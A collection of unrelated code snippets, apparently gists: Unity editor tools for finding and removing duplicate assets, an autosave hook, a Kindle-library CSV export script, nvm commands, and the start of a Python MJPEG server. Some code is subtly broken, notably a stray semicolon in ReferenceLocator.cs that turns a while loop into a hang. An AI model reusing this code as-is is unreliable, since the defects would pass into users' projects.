 private const string DUMMY_TEXTURE_PATH = ""Assets/zzy_dummyy_texturee.png"";
 private const string SAVE_FILE_PATH = ""Library/DuplicateAssetDetector.json"";
 private const float BUTTON_DRAG_THRESHOLD_SQR = 600f;


 private readonly MethodInfo instanceIDFromGUID = typeof( AssetDatabase ).GetMethod( ""GetInstanceIDFromGUID"", BindingFlags.NonPublic | BindingFlags.Static );


 private List<DuplicateAssets> duplicates = new List<DuplicateAssets>(); // This is not readonly so that it can be serialized


 private SearchField searchField;
 private string searchTerm;
 private readonly List<DuplicateAssets> searchResults = new List<DuplicateAssets>();


 private bool drawThumbnails = true;


 private double lastClickTime;
 private string lastClickedPath;


 private readonly GUIContent buttonGUIContent = new GUIContent();
 private Vector2 buttonPressPosition;
 private Vector2 scrollPos;


 [MenuItem( ""Window/Duplicate Asset Detector"" )]
 private static void Init()
 {
 DuplicateAssetDetector window = GetWindow<DuplicateAssetDetector>();
		window.titleContent = new GUIContent( ""Duplicate Assets"" );
		window.minSize = new Vector2( 200f, 150f );
		window.Show();
 }


 private void Awake()
 {
		LoadSession( null );
 }


 private void OnEnable()
 {
 searchField = new SearchField();
		RefreshSearch();
 }


 // Show additional options in the window's context menu
 public void AddItemsToMenu( GenericMenu menu )
 {
 if( duplicates.Count > 0 )
			menu.AddItem( new GUIContent( ""Save To Clipboard"" ), false, () => GUIUtility.systemCopyBuffer = JsonUtility.ToJson( new SaveData() { duplicates = duplicates }, true ) );
 else
			menu.AddDisabledItem( new GUIContent( ""Save To Clipboard"" ) );


 if( string.IsNullOrEmpty( GUIUtility.systemCopyBuffer ) )
			menu.AddDisabledItem( new GUIContent( ""Load From Clipboard"" ) );
 else
 {
			menu.AddItem( new GUIContent( ""Load From Clipboard"" ), false, () =>
 {
 string json = GUIUtility.systemCopyBuffer;
				LoadSession( json );
				SaveSession( json ); // If load succeeds, overwrite the saved session
 } );
 }


		menu.AddSeparator( """" );


		menu.AddItem( new GUIContent( ""Draw Thumbnails"" ), drawThumbnails, () => drawThumbnails = !drawThumbnails );
 }


 private void OnGUI()
 {
 Event ev = Event.current;
 scrollPos = GUILayout.BeginScrollView( scrollPos );


 // Calculate duplicate assets
 if( GUILayout.Button( ""Refresh"" ) )
 {
 try
 {
 double startTime = EditorApplication.timeSinceStartup;


				CalculateDuplicateAssets();
				SaveSession( null );


				Debug.Log( ""Refreshed in "" + ( EditorApplication.timeSinceStartup - startTime ) + "" seconds."" );
 }
 catch( Exception e )
 {
				Debug.LogException( e );
 }
 finally
 {
				EditorUtility.ClearProgressBar();


 if( File.Exists( DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( DUMMY_TEXTURE_PATH );
 }


			GUIUtility.ExitGUI();
 }


 // Draw found duplicate assets
 if( duplicates.Count > 0 )
 {
 Color guiColor = GUI.color;
			EditorGUILayout.HelpBox( ""- Assets' import settings are ignored, you must check them manually\n- Double click a path to select the asset\n- Click a thumbnail to select all duplicates in that group\n- Right/middle click a path or thumbnail to hide it from the list"", MessageType.Info );


 string _searchTerm = searchField.OnToolbarGUI( searchTerm );
 if( _searchTerm != searchTerm )
 {
 searchTerm = _searchTerm;
				RefreshSearch();


				GUIUtility.ExitGUI();
 }


 List<DuplicateAssets> duplicateAssets = string.IsNullOrEmpty( searchTerm ) ? duplicates : searchResults;
 for( int i = 0; i < duplicateAssets.Count; i++ )
 {
 List<string> paths = duplicateAssets[i].paths;


 if( !drawThumbnails )
					GUILayout.Label( ""----------"" );
 else
 {
 Texture icon = AssetDatabase.GetCachedIcon( paths[0] );
 Rect rect = GUILayoutUtility.GetRect( 24f, 24f );
					GUI.DrawTexture( rect, icon ? icon : Texture2D.whiteTexture, ScaleMode.ScaleToFit );


					GUI.color = Color.clear;


 if( GUI.Button( rect, GUIContent.none ) )
 {
 if( ev.button == 0 )
 {
 // Select all duplicate assets in this group
 List<Object> allDuplicates = new List<Object>( paths.Count );
 for( int j = 0; j < paths.Count; j++ )
 {
 if( File.Exists( paths[j] ) )
									allDuplicates.Add( AssetDatabase.LoadMainAssetAtPath( paths[j] ) );
 }


 if( !ev.control && !ev.command && !ev.shift )
								Selection.objects = allDuplicates.ToArray();
 else
 {
 // While holding CTRL, either add all duplicate assets to current selection or remove them all from current selection
 List<Object> selection = new List<Object>( Selection.objects );
 bool allDuplicatesAreInSelection = true;
 for( int j = 0; j < allDuplicates.Count; j++ )
 {
 if( !selection.Contains( allDuplicates[j] ) )
 {
										selection.Add( allDuplicates[j] );
 allDuplicatesAreInSelection = false;
 }
 }


 if( allDuplicatesAreInSelection )
 {
 for( int j = 0; j < allDuplicates.Count; j++ )
										selection.Remove( allDuplicates[j] );
 }


								Selection.objects = selection.ToArray();
 }
 }
 else if( ev.button == 1 )
 {
 // Show an option to hide these duplicate assets from the list
 int _i = duplicates.IndexOf( duplicateAssets[i] );
 GenericMenu menu = new GenericMenu();
							menu.AddItem( new GUIContent( ""Hide"" ), false, () => HideDuplicateAssetGroup( _i ) );
							menu.ShowAsContext();
 }
 else
							HideDuplicateAssetGroup( duplicates.IndexOf( duplicateAssets[i] ) );
 }


					GUI.color = guiColor;
 }


 for( int j = 0; j < paths.Count; j++ )
 {
 // Buttons must support 1) click and 2) drag & drop. The most reliable way is to simulate GUILayout.Button from scratch
					buttonGUIContent.text = paths[j];
 Rect buttonRect = GUILayoutUtility.GetRect( buttonGUIContent, EditorStyles.textArea );
 int buttonControlID = GUIUtility.GetControlID( FocusType.Passive );
 switch( ev.GetTypeForControl( buttonControlID ) )
 {
 case EventType.MouseDown:
 if( buttonRect.Contains( ev.mousePosition ) )
 {
								GUIUtility.hotControl = buttonControlID;
 buttonPressPosition = ev.mousePosition;
 }


 break;
 case EventType.MouseDrag:
 if( GUIUtility.hotControl == buttonControlID && ev.button == 0 && ( ev.mousePosition - buttonPressPosition ).sqrMagnitude >= BUTTON_DRAG_THRESHOLD_SQR )
 {
								GUIUtility.hotControl = 0;


 Object asset = AssetDatabase.LoadMainAssetAtPath( paths[j] );
 if( asset )
 {
 // Credit: https://forum.unity.com/threads/editor-draganddrop-bug-system-needs-to-be-initialized-by-unity.219342/#post-1464056
									DragAndDrop.PrepareStartDrag();
									DragAndDrop.objectReferences = new Object[] { asset };
									DragAndDrop.StartDrag( ""DuplicateAssetDetector"" );
 }


								ev.Use();
 }


 break;
 case EventType.MouseUp:
 if( GUIUtility.hotControl == buttonControlID )
 {
								GUIUtility.hotControl = 0;


 if( buttonRect.Contains( ev.mousePosition ) )
 {
 if( ev.button == 0 && File.Exists( paths[j] ) )
 {
 // Ping clicked duplicate asset
 double clickTime = EditorApplication.timeSinceStartup;
 if( clickTime - lastClickTime < 0.5f && lastClickedPath == paths[j] )
 {
 if( !ev.control && !ev.command && !ev.shift )
												Selection.objects = new Object[] { AssetDatabase.LoadMainAssetAtPath( paths[j] ) };
 else
 {
 // While holding CTRL, either add clicked asset to current selection or remove it from current selection
 Object asset = AssetDatabase.LoadMainAssetAtPath( paths[j] );
 List<Object> selection = new List<Object>( Selection.objects );
 if( !selection.Remove( asset ) )
													selection.Add( asset );


												Selection.objects = selection.ToArray();
 }
 }
 else if( instanceIDFromGUID != null )
											EditorGUIUtility.PingObject( (int) instanceIDFromGUID.Invoke( null, new object[] { AssetDatabase.AssetPathToGUID( paths[j] ) } ) );
 else
											EditorGUIUtility.PingObject( AssetDatabase.LoadMainAssetAtPath( paths[j] ) );


 lastClickTime = clickTime;
 lastClickedPath = paths[j];
 }
 else if( ev.button == 1 )
 {
 // Show an option to hide that duplicate asset from the list
 int _i = duplicates.IndexOf( duplicateAssets[i] ), _j = j;
 GenericMenu menu = new GenericMenu();
										menu.AddItem( new GUIContent( ""Hide"" ), false, () => HideDuplicateAsset( _i, _j ) );
										menu.ShowAsContext();
 }
 else if( ev.button == 2 )
										HideDuplicateAsset( duplicates.IndexOf( duplicateAssets[i] ), j );
 }
 }
 break;
 case EventType.Repaint:
							EditorStyles.textArea.Draw( buttonRect, buttonGUIContent, buttonControlID );
 break;
 }


 if( ev.isMouse && GUIUtility.hotControl == buttonControlID )
						ev.Use();
 }


 if( drawThumbnails )
					GUILayout.Space( EditorGUIUtility.singleLineHeight );
 }
 }


		GUILayout.EndScrollView();
 }


 private void CalculateDuplicateAssets()
 {
 // Dummy Texture is used while calculating Textures' hashes
		CreateDummyTexture();


 // Key: hash value
 // Value: all assets that are sharing that hash
 Dictionary<string, List<string>> texturesHashLookup = new Dictionary<string, List<string>>( 512 );
 Dictionary<string, List<string>> genericHashLookup = new Dictionary<string, List<string>>( 2048 );


		duplicates.Clear();


 try
 {
 string[] paths = AssetDatabase.GetAllAssetPaths();
 string pathsLengthStr = paths.Length.ToString();
 float progressMultiplier = 1f / paths.Length;


 for( int i = 0; i < paths.Length; i++ )
 {
 if( i % 30 == 0 && EditorUtility.DisplayCancelableProgressBar( ""Please wait..."", string.Concat( ""Searching: "", ( i + 1 ).ToString(), ""/"", pathsLengthStr ), ( i + 1 ) * progressMultiplier ) )
 throw new Exception( ""Search aborted"" );


 if( string.IsNullOrEmpty( paths[i] ) || !paths[i].StartsWith( ""Assets/"" ) || paths[i] == DUMMY_TEXTURE_PATH )
 continue;


 if( Directory.Exists( paths[i] ) )
 continue;


 string hash;
 Dictionary<string, List<string>> hashLookup;


 Type assetType = AssetDatabase.GetMainAssetTypeAtPath( paths[i] );
 if( typeof( Texture ).IsAssignableFrom( assetType ) )
 {
 long? textureHash = CalculateTextureHash( paths[i] );
 if( textureHash == null )
 continue;


 hash = textureHash.Value.ToString();
 hashLookup = texturesHashLookup;
 }
 //else if( typeof( GameObject ).IsAssignableFrom( assetType ) && !paths[i].EndsWith( "".prefab"" ) && AssetImporter.GetAtPath( paths[i] ) as ModelImporter )
 //{
 //	hash = CalculateModelHash( paths[i] ).ToString();
 //	hashLookup = modelsHashLookup;
 //}
 else
 {
 hash = CalculateFileHash( paths[i] );
 hashLookup = genericHashLookup;
 }


 List<string> hashMatch;
 if( !hashLookup.TryGetValue( hash, out hashMatch ) )
 {
 hashMatch = new List<string>( 1 );
					hashLookup[hash] = hashMatch;
 }


				hashMatch.Add( paths[i] );
 }
 }
 finally
 {
			FindDuplicatesInLookup( texturesHashLookup, false );
			FindDuplicatesInLookup( genericHashLookup, true );
 }
 }


 // Finds entries in the lookup table that have multiple paths (i.e. duplicates)
 private void FindDuplicatesInLookup( Dictionary<string, List<string>> lookup, bool sortByExtension )
 {
 int duplicatesPrevCount = duplicates.Count;


 foreach( var kvPair in lookup )
 {
 List<string> paths = kvPair.Value;
 if( paths.Count > 1 )
 {
				paths.Sort();
				duplicates.Add( new DuplicateAssets() { paths = paths } );
 }
 }


 // Sort each lookup results amongst themselves
 int count = duplicates.Count - duplicatesPrevCount;
 if( count > 1 )
			duplicates.Sort( duplicatesPrevCount, count, new DuplicateAssets.Comparer() { sortByExtension = sortByExtension } );
 }


 // Creates dummy Texture asset that will be used to generate Textures' hashes
 private void CreateDummyTexture()
 {
 if( !File.Exists( DUMMY_TEXTURE_PATH ) )
 {
			File.WriteAllBytes( DUMMY_TEXTURE_PATH, new Texture2D( 2, 2 ).EncodeToPNG() );
			AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );
 }


 TextureImporter textureImporter = AssetImporter.GetAtPath( DUMMY_TEXTURE_PATH ) as TextureImporter;
		textureImporter.maxTextureSize = 32;
		textureImporter.isReadable = true;
		textureImporter.filterMode = FilterMode.Point;
		textureImporter.mipmapEnabled = false;
		textureImporter.alphaSource = TextureImporterAlphaSource.FromInput;
		textureImporter.alphaIsTransparency = true;
		textureImporter.textureCompression = TextureImporterCompression.Uncompressed;
		textureImporter.SaveAndReimport();
 }


 // Refreshes search results
 private void RefreshSearch()
 {
 if( string.IsNullOrEmpty( searchTerm ) )
 return;


 CompareInfo ci = new CultureInfo( ""en-US"" ).CompareInfo;
		searchResults.Clear();


 for( int i = 0; i < duplicates.Count; i++ )
 {
 List<string> paths = duplicates[i].paths;
 for( int j = 0; j < paths.Count; j++ )
 {
 // Case insensitive search (credit: https://stackoverflow.com/a/36254805/2373034)
 if( ci.IndexOf( paths[j], searchTerm, CompareOptions.IgnoreCase | CompareOptions.IgnoreNonSpace ) != -1 )
 {
					searchResults.Add( duplicates[i] );
 break;
 }
 }
 }
 }


 // Calculates file's MD5 hash
 private string CalculateFileHash( string assetPath )
 {
 using( MD5 md5 = MD5.Create() )
 using( FileStream stream = File.OpenRead( assetPath ) )
 {
 return BitConverter.ToString( md5.ComputeHash( stream ) );
 }
 }


 // Calculates downsized Texture's pixels' hash
 private long? CalculateTextureHash( string texturePath )
 {
		File.Copy( texturePath, DUMMY_TEXTURE_PATH, true );
		AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );


 Texture2D texture = AssetDatabase.LoadAssetAtPath<Texture2D>( DUMMY_TEXTURE_PATH );
 if( !texture ) // RenderTextures, for example, are also Textures but not Texture2Ds
 return null;


		Color32[] colors = texture.GetPixels32();
 unchecked
 {
 long hash = 0;
 for( int i = 0; i < colors.Length; i++ )
 {
 long pixelValue = colors[i].r * 256 * 256 * 256 + colors[i].g * 256 * 256 + colors[i].b * 256 + colors[i].a;
 hash = ( hash << 5 ) + hash ^ pixelValue;
 }


 return hash;
 }
 }


 // Calculates model's vertices hash
 // Not used because multiple FBX files may have shared vertices but different animation clips
 private long CalculateModelHash( string modelPath )
 {
 long hash = 17;
		Object[] subAssets = AssetDatabase.LoadAllAssetRepresentationsAtPath( modelPath );
 for( int i = 0; i < subAssets.Length; i++ )
 {
 Mesh mesh = subAssets[i] as Mesh;
 if( !mesh )
 continue;


			Vector3[] vertices = mesh.vertices;
 unchecked
 {
 for( int j = 0; j < vertices.Length; j++ )
 {
 hash = hash * 23 + vertices[j].x.GetHashCode();
 hash = hash * 23 + vertices[j].y.GetHashCode();
 hash = hash * 23 + vertices[j].z.GetHashCode();
 }
 }
 }


 return hash;
 }


 // Hides the duplicate asset at the specified index
 private void HideDuplicateAsset( int groupIndex, int assetIndex )
 {
 if( duplicates[groupIndex].paths.Count <= 2 )
 {
 int searchGroupIndex = searchResults.IndexOf( duplicates[groupIndex] );
 if( searchGroupIndex >= 0 )
				searchResults.RemoveAt( searchGroupIndex );


			duplicates.RemoveAt( groupIndex );
 }
 else
			duplicates[groupIndex].paths.RemoveAt( assetIndex );


		SaveSession( null );
		Repaint();
 }


 // Hides all duplicate assets in the specified group
 private void HideDuplicateAssetGroup( int groupIndex )
 {
 int searchGroupIndex = searchResults.IndexOf( duplicates[groupIndex] );
 if( searchGroupIndex >= 0 )
			searchResults.RemoveAt( searchGroupIndex );


		duplicates.RemoveAt( groupIndex );


		SaveSession( null );
		Repaint();
 }


 // Saves current session to file
 private void SaveSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 json = JsonUtility.ToJson( new SaveData() { duplicates = duplicates }, false );


		File.WriteAllText( SAVE_FILE_PATH, json );
 }


 // Restores previous session
 private void LoadSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 {
 if( !File.Exists( SAVE_FILE_PATH ) )
 return;


 json = File.ReadAllText( SAVE_FILE_PATH );
 }


 SaveData saveData = JsonUtility.FromJson<SaveData>( json );


 // Remove non-existent duplicates
 for( int i = saveData.duplicates.Count - 1; i >= 0; i-- )
 {
 List<string> paths = saveData.duplicates[i].paths;
 for( int j = paths.Count - 1; j >= 0; j-- )
 {
 if( !File.Exists( paths[j] ) )
					paths.RemoveAt( j );
 }


 if( paths.Count <= 1 )
				saveData.duplicates.RemoveAt( i );
 }


 duplicates = saveData.duplicates;
		Repaint();
 }
}
==<SEPERATOR>==
AutoSave.cs
//Works on Unity 5.3+


using UnityEditor;
using UnityEditor.SceneManagement;


[InitializeOnLoad]
public class AutoSave
{
 //Constructor called by Unity Editor
 static AutoSave()
 {
        EditorApplication.playModeStateChanged += SaveWhenExitEdit;
 }


 private static void SaveWhenExitEdit(PlayModeStateChange change)
 {
 //If we're exiting edit mode (about to play the scene)
 if (change == PlayModeStateChange.ExitingEditMode)
 {
 //Save the scene and the assets
            EditorSceneManager.SaveOpenScenes();
            AssetDatabase.SaveAssets();
 }
 }
}
==<SEPERATOR>==
AnimAssetDuplicator.cs
using System.IO;
using UnityEditor;
using UnityEngine;


namespace Assets.Editor
{
 public class AnimAssetDuplicator
 {
 [MenuItem(""Assets/Model/Duplicate Animation Assets &d"")]
 public static void DuplicateAnimationAssetsInThisFolder()
 {
 foreach (var gameObject in Selection.gameObjects)
 {
 string path = AssetDatabase.GetAssetPath(gameObject);
                Object[] objects = AssetDatabase.LoadAllAssetsAtPath(path);
 foreach (Object obj in objects)
 {
                    DuplicateAnimationClip(obj as AnimationClip);
 }
 }
 }


 private static void DuplicateAnimationClip(AnimationClip sourceClip)
 {
 if (sourceClip != null && !sourceClip.empty && !sourceClip.name.Contains(""preview""))
 {
 string path = AssetDatabase.GetAssetPath(sourceClip);
 path = Path.Combine(Path.GetDirectoryName(path), sourceClip.name) + "".anim"";
 string newPath = AssetDatabase.GenerateUniqueAssetPath(path);
 AnimationClip newClip = new AnimationClip();
                EditorUtility.CopySerialized(sourceClip, newClip);
                AssetDatabase.CreateAsset(newClip, newPath);
 }
 }
 }
}
==<SEPERATOR>==
ReferenceLocator.cs
using System.Collections.Generic;
using System.Linq;
using UnityEditor;
using UnityEditor.Animations;
using UnityEngine;


public class LinkedMaterialSelector : EditorWindow
{
 static bool FileExistsScuffed(string path)
 {
 return !string.IsNullOrEmpty(AssetDatabase.AssetPathToGUID(path));
 }
 static string GenerateNonConflictingPath(string path)
 {
 if (string.IsNullOrEmpty(path))
 return GUID.Generate().ToString();
 
 if (!FileExistsScuffed(path))
 return path;
 
 var parts = path.Split('_').ToList();
 if (!int.TryParse(parts[parts.Count-1], out int i))
 {
 i = 0;
            parts.Add(""0"");
 }


 while (FileExistsScuffed(path)) ;
 {
            parts[parts.Count - 1] = (++i).ToString();
 path = string.Join(""_"", parts);
 }


 return path;
 }
 static string GetFileDirectoryPath(string filePath)
 {
 int lastSlash = filePath.LastIndexOf('/');
 if (lastSlash <= 0)
 return string.Empty;


 return filePath.Substring(0, lastSlash);
 }
 static bool EnsureFolder(string path)
 {
 if (string.IsNullOrEmpty(path))
 return false;


 if (AssetDatabase.IsValidFolder(path))
 return true;


 string[] parts = path.Split('/');


 if (parts.Length < 2)
 return false;


 string currentPath = parts[0];


 if (currentPath != ""Assets"")
 return false;


 for (int i = 1; i < parts.Length; i++)
 {
 string newPath = currentPath + ""/"" + parts[i];
 if (!AssetDatabase.IsValidFolder(newPath))
 {
 if (string.IsNullOrEmpty(AssetDatabase.CreateFolder(currentPath, parts[i])))
 {
 return false;
 }
 }
 currentPath = newPath;
 }


 return AssetDatabase.IsValidFolder(path);
 }
 static bool TryMoveFile(string src, string dst)
 {
 if (!EnsureFolder(GetFileDirectoryPath(dst)))
 return false;


 if (!string.IsNullOrEmpty(AssetDatabase.ValidateMoveAsset(src, dst)))
 return false;


 return string.IsNullOrEmpty(AssetDatabase.MoveAsset(src, dst));
 }
 static bool IsSame(Keyframe a, Keyframe b)
 {
 return
            Mathf.Approximately(a.time, b.time) &&
            Mathf.Approximately(a.value, b.value) &&
            Mathf.Approximately(a.inTangent, b.inTangent) &&
            Mathf.Approximately(a.inWeight, b.inWeight) &&
            Mathf.Approximately(a.outTangent, b.outTangent) &&
            Mathf.Approximately(a.outWeight, b.outWeight);
 }
 static bool IsSame(AnimationCurve a, AnimationCurve b)
 {
 if (a == b || a.length != b.length)
 return false;


 for (int j = 0; j < a.length; j++)
 {
 if (
 !IsSame(a[j], b[j]) ||
                AnimationUtility.GetKeyLeftTangentMode(a, j) != AnimationUtility.GetKeyLeftTangentMode(b, j) ||
                AnimationUtility.GetKeyRightTangentMode(a, j) != AnimationUtility.GetKeyRightTangentMode(b, j)
 )
 {
 return false;
 }
 }


 return true;
 }
 static bool IsSame(AnimationClip a, AnimationClip b)
 {
 if (a == b || a.empty && b.empty)
 return true;


 if (!Mathf.Approximately(a.length, b.length) || !Mathf.Approximately(a.frameRate, b.frameRate))
 return false;


 string path = AssetDatabase.GetAssetPath(a);
 if (!path.StartsWith(""Assets""))
 return false;


        EditorCurveBinding[] aBindings = AnimationUtility.GetCurveBindings(a);
        EditorCurveBinding[] bBindings = AnimationUtility.GetCurveBindings(b);


 if (aBindings.Length != bBindings.Length)
 return false;


 for (int i = 0; i < aBindings.Length; i++)
 {
 EditorCurveBinding aBinding = aBindings[i];
 EditorCurveBinding bBinding = bBindings[i];


 if (aBinding.path != bBinding.path || aBinding.propertyName != bBinding.propertyName)
 return false;


 AnimationCurve aCurve = AnimationUtility.GetEditorCurve(a, aBinding);
 AnimationCurve bCurve = AnimationUtility.GetEditorCurve(b, bBinding);


 if (!IsSame(aCurve, bCurve))
 return false;
 }


 return true;
 }


 static IEnumerable<T> FindAssetsByType<T>() where T : UnityEngine.Object
 {
 string filter = ""t:"" + typeof(T).ToString().Replace(""UnityEngine."", """");


 foreach (string guid in AssetDatabase.FindAssets(filter))
 {
 string assetPath = AssetDatabase.GUIDToAssetPath(guid);
 T asset = AssetDatabase.LoadAssetAtPath<T>(assetPath);
 if (asset != null)
 {
 yield return asset;
 }
 }
 }


 static IEnumerable<Material> FindLinkedMaterials(Texture2D selectedTexture)
 {
 foreach (Material material in FindAssetsByType<Material>())
 {
 foreach (string texName in material.GetTexturePropertyNames())
 {
 if (material.GetTexture(texName) is Texture2D texture && texture == selectedTexture)
 {
 yield return material;
 }
 }
 }
 }
 static IEnumerable<Texture2D> FindLinkedTextures(Material selectedMaterial)
 {
 foreach (string texName in selectedMaterial.GetTexturePropertyNames())
 {
 if (selectedMaterial.GetTexture(texName) is Texture2D texture)
 {
 yield return texture;
 }
 }
 }
 static IEnumerable<Texture2D> FindDuplicateTextures(Texture2D selectedTexture)
 {
 foreach (Texture2D texture in FindAssetsByType<Texture2D>())
 {
 if (texture.imageContentsHash == selectedTexture.imageContentsHash)
 {
 yield return texture;
 }
 }
 }
 static IEnumerable<AnimationClip> FindDuplicateAnimationClips(AnimationClip selectedAnimationClip)
 {
 foreach (AnimationClip animationClip in FindAssetsByType<AnimationClip>())
 if (IsSame(animationClip, selectedAnimationClip))
 yield return animationClip;
 }
 private static void Crawl(BlendTree blendTree)
 {
 foreach (ChildMotion childMotion in blendTree.children)
            Crawl(childMotion.motion);
 }


 private const string ANIM_PATH = ""Assets/Project/Components/Animations/"";
 private static HashSet<AnimationClip> AllClips = new HashSet<AnimationClip>();
 private static HashSet<AnimationClip> DuplicateClips = new HashSet<AnimationClip>();
 private static Motion Crawl(Motion motion)
 {
 if (motion is AnimationClip clip)
 {
 var matchingClips = AllClips.Where(c => IsSame(c, clip));


 string clipPath = AssetDatabase.GetAssetPath(clip);
 if (!clipPath.StartsWith(ANIM_PATH))
 {
 AnimationClip betterClip = matchingClips.Where(c => c != clip && AssetDatabase.GetAssetPath(c).StartsWith(ANIM_PATH)).FirstOrDefault();
 if (betterClip != null)
 {
 clip = betterClip;
 }
 else
 {
 string dstPath = GenerateNonConflictingPath(clipPath.Substring(clipPath.LastIndexOf('/') + 1));


                    Debug.Log(dstPath);


 if (TryMoveFile(clipPath, ANIM_PATH + $""anim_{GUID.Generate()}.anim""))
 {
                        AssetDatabase.Refresh();
 }
 else
 {
                        Debug.Log(""Failed to move!"");
 }
 }
 }


 foreach (var badClip in matchingClips.ToArray().Where(c => c != clip))
 {
                AllClips.Remove(badClip);
                DuplicateClips.Add(badClip);
 }


 motion = clip;
 }
 else if (motion is BlendTree blendTree)
 {
            Crawl(blendTree);
 }


 return motion;
 }
 private static void Crawl(AnimatorState animatorState)
 {
        animatorState.motion = Crawl(animatorState.motion);
 }
 private static void Crawl(AnimatorStateMachine stateMachine)
 {
        ChildAnimatorState[] states = stateMachine.states;
 for (int i = 0; i < states.Length; i++)
 {
            Crawl(states[i].state);
 }


        ChildAnimatorStateMachine[] machines = stateMachine.stateMachines;
 for (int i = 0; i < machines.Length; i++)
 {
            Crawl(machines[i].stateMachine);
 }
 }
 private static void Crawl(AnimatorController controller)
 {
 foreach (AnimatorControllerLayer layer in controller.layers)
 {
            Crawl(layer.stateMachine);
 }
 }


 [MenuItem(""Assets/Refloc/Linked Materials"", true)]
 private static bool SelectLinkedMaterialsValidator()
 {
 return Selection.activeObject is Texture2D;
 }
 [MenuItem(""Assets/Refloc/Linked Materials"")]
 private static void SelectLinkedMaterials()
 {
        Selection.objects = FindLinkedMaterials(Selection.activeObject as Texture2D).Cast<Object>().ToArray();
 }
 [MenuItem(""Assets/Refloc/Linked Textures"", true)]
 private static bool SelectLinkedTexture2DsValidator()
 {
 return Selection.activeObject is Material;
 }
 [MenuItem(""Assets/Refloc/Linked Textures"")]
 private static void SelectLinkedTexture2Ds()
 {
        Selection.objects = FindLinkedTextures(Selection.activeObject as Material).Cast<Object>().ToArray();
 }
 [MenuItem(""Assets/Refloc/Duplicates"", true)]
 private static bool SelectDuplicatesValidator()
 {
 return Selection.activeObject is Texture2D || Selection.activeObject is AnimationClip;
 }
 [MenuItem(""Assets/Refloc/Duplicates"")]
 private static void SelectDuplicates()
 {
 if (Selection.activeObject is Texture2D texture)
 {
            Selection.objects = FindDuplicateTextures(texture).Cast<Object>().ToArray();
 }
 else if (Selection.activeObject is AnimationClip animationClip)
 {
            Selection.objects = FindDuplicateAnimationClips(animationClip).Cast<Object>().Where(a => a != animationClip).ToArray();
 }
 }
 [MenuItem(""Assets/Refloc/Deduplicate"", true)]
 private static bool DeDuplicateValidator()
 {
 return Selection.activeObject is Texture2D || Selection.activeObject is AnimationClip;
 }
 [MenuItem(""Assets/Refloc/Deduplicate"")]
 private static void DeDuplicate()
 {
 if (Selection.activeObject is Texture2D texture) // Materials, and ???
 {
 }
 else if (Selection.activeObject is AnimationClip animationClip) // AnimatorOverrideControllers, Assets, Prefabs, Scripts
 {
 AllClips = new HashSet<AnimationClip>(FindAssetsByType<AnimationClip>());
 foreach (AnimatorController controller in FindAssetsByType<RuntimeAnimatorController>().Cast<AnimatorController>())
 {
                Crawl(controller);
 }
            Debug.Log(DuplicateClips.Count);
 foreach (var badClip in DuplicateClips)
 {
 try
 {
                    AssetDatabase.DeleteAsset(AssetDatabase.GetAssetPath(badClip));
 }
 catch (System.Exception)
 {
 }
 }
 }
 }
}
==<SEPERATOR>==
EditorTools.cs
using UnityEditor;
using UnityEngine;


public class EditorTools
{
 public static Object GetAsset(string name = null, string type = null)
 {
 string search = string.Empty;
 if (!string.IsNullOrEmpty(name))
 {
 search += name;
 }
 if (!string.IsNullOrEmpty(type))
 {
 search = string.Format(""{0} t:{1}"", search, type);
 }


 string[] guids = AssetDatabase.FindAssets(search);
 if (guids == null || guids.Length < 1)
 {
 return null;
 }


 string guid = guids[0];
 string path = AssetDatabase.GUIDToAssetPath(guid);
 Object asset = AssetDatabase.LoadMainAssetAtPath(path);


 return asset;
 }


 public static void SelectAsset(string name = null, string type = null)
 {
 Object asset = EditorTools.GetAsset(name, type);
 if (asset != null)
 {
			EditorTools.SelectAsset(asset);
 }
 }


 public static void SelectAsset(Object asset)
 {
		Selection.activeObject = asset;
 }
}
==<SEPERATOR>==
ExportKindle.js
// The following data should be run in the console while viewing the page https://read.amazon.com/
// It will export a CSV file called ""download"" which can (and should) be renamed with a .csv extension


var db = openDatabase('K4W', '3', 'thedatabase', 1024 * 1024);


getAmazonCsv = function() {
 // Set header for CSV export line - change this if you change the fields used
 var csvData = ""ASIN,Title,Authors,PurchaseDate\n"";


 db.transaction(function(tx) {
 tx.executeSql('SELECT * FROM bookdata;', [], function(tx, results) {
 var len = results.rows.length;


 for (i = 1; i < len; i++) {
 // Get the data
 var asin = results.rows.item(i).asin;
 var title = results.rows.item(i).title;
 var authors = JSON.parse(results.rows.item(i).authors);
 var purchaseDate = new Date(results.rows.item(i).purchaseDate).toLocaleDateString();


 // Remove double quotes from titles to not interfere with CSV double-quotes 
 title = title.replace(/""/g, '');


 
 // Concatenate the authors list - uncomment the next line to get all authors separated by "";""
 // var authorList = authors.join(';');
 // OR Take only first author - comment the next line if you uncommented the previous one
 var authorList = authors[0];


 // Write out the CSV line
 csvData += '""' + asin + '"",""' + title + '"",""' + authorList + '"",""' + purchaseDate + '""\n'
 }


 // ""Export"" the data
 window.location = 'data:text/csv;charset=utf8,' + encodeURIComponent(csvData);


 console.log(""Sample Row:"");
 console.log(results.rows.item(1));
 });
 });
};


getAmazonCsv();
==<SEPERATOR>==
nvmCommands.js
// check version
node -v || node --version


// list locally installed versions of node
nvm ls


// list remove available versions of node
nvm ls-remote


// install specific version of node
nvm install 18.16.1


// set default version of node
nvm alias default 18.16.1


// switch version of node
nvm use 20.5.1


// install latest LTS version of node (Long Term Support)
nvm install --lts


// install latest stable version of node
nvm install stable
"
"live-mjpeg-stream.py
","#!/usr/bin/python
#based on the ideas from http://synack.me/blog/implementing-http-live-streaming
# Run this script and then launch the following pipeline:
# gst-launch videotestsrc pattern=ball ! video/x-raw-rgb, framerate=15/1, width=640, height=480 !  jpegenc ! multipartmux boundary=spionisto ! tcpclientsink port=9999


from Queue import Queue
from threading import Thread
from socket import socket
from select import select
from wsgiref.simple_server import WSGIServer, make_server, WSGIRequestHandler
from SocketServer import ThreadingMixIn




class MyWSGIServer(ThreadingMixIn, WSGIServer):
 pass 


def create_server(host, port, app, server_class=MyWSGIServer,  
 handler_class=WSGIRequestHandler):
 return make_server(host, port, app, server_class, handler_class) 


INDEX_PAGE = """"""
<html>
<head>
    <title>Gstreamer testing</title>
</head>
<body>
<h1>Testing a dummy camera with GStreamer</h1>
<img src=""/mjpeg_stream""/>
<hr />
</body>
</html>
""""""
